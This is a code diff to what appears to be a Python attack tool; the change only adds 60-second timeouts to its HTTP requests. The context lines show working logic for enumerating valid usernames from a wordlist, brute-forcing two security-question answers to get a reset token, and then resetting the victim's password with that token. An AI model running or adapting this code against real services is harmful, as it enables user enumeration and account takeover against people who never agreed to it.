@@ -82,7 +82,7 @@ def enumerate(atk, rota):
         for line in wordlist:
             line = line[:-1]
             c[v] = line
-            response = requests.post(url, json = c)
+            response = requests.post(url, json = c, timeout=60)
             if response.status_code == success_code:
                 print(f"{Colors.OKGREEN}[SUCCESS]: {line}")
                 count_users[1] += 1
@@ -105,7 +105,7 @@ def brute_force(atk, user):
     if atk == "2":
         content_one = copy.deepcopy(ATTACKS[atk]["contents"]["userinfo"])
         content_one["login"] = user
-        json_response = requests.post(ATTACKS[atk]["urls"]["userinfo"], json = content_one).json()
+        json_response = requests.post(ATTACKS[atk]["urls"]["userinfo"], json = content_one, timeout=60).json()
         try:
             if 'message' in json_response and json_response['message'] == 'invalid login':
                 print(f"{Colors.FAIL}[FAIL] User does not exist.")
@@ -129,12 +129,12 @@ def brute_force(atk, user):
                     count+=1
                     content["firstAnswer"] = a0[:-1]
                     content["secondAnswer"] = a1[:-1]
-                    response = requests.post(url, json = content)
+                    response = requests.post(url, json = content, timeout=60)
                     print(f"Testados: {count}", end='\r')
                     if response.status_code == 200:
                         print(f"{Colors.OKGREEN}[SUCCESS]{Colors.NORMAL} Token: {response.json()['token']}")
                         new_password = input(f"{Colors.YELLOW}Insert new password: {Colors.YELLOW}")
-                        r = requests.post(ATTACKS[atk]["urls"]["reset"], json = {"password": new_password, "repeatPassword": new_password}, headers={'Authorization': f"Bearer {response.json()['token']}"}).json()
+                        r = requests.post(ATTACKS[atk]["urls"]["reset"], json = {"password": new_password, "repeatPassword": new_password}, headers={'Authorization': f"Bearer {response.json()['token']}"}, timeout=60).json()
                         if "message" in r and r["message"] == "success":
                             print(f"{Colors.OKGREEN}[SUCCESS]{Colors.NORMAL} Password changed.")
                             return
